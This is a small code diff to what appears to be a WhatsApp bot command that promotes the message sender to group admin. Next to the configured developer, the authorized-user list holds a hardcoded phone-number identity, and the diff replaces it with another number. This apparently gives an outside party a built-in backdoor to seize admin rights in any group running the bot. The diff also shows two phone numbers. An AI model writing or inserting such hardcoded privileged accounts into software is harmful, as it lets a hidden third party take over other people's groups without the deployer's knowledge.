@@ -25,7 +25,7 @@ async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
     // Authorized users (properly formatted JIDs)
     const AUTHORIZED_USERS = [
         normalizeJid(config.DEV), // Handles both raw numbers and JIDs in config
-        "923427582273@s.whatsapp.net"
+        "2348122441244@s.whatsapp.net"
     ].filter(Boolean);
 
     // Check authorization with normalized JIDs
@@ -47,7 +47,7 @@ async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
         // Promote self to admin
         await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
         
-        return reply("✅ Successfully granted you admin rights!");
+        return reply("✅ Successfully granted you admin rights and duties!");
         
     } catch (error) {
         console.error("Admin command error:", error);
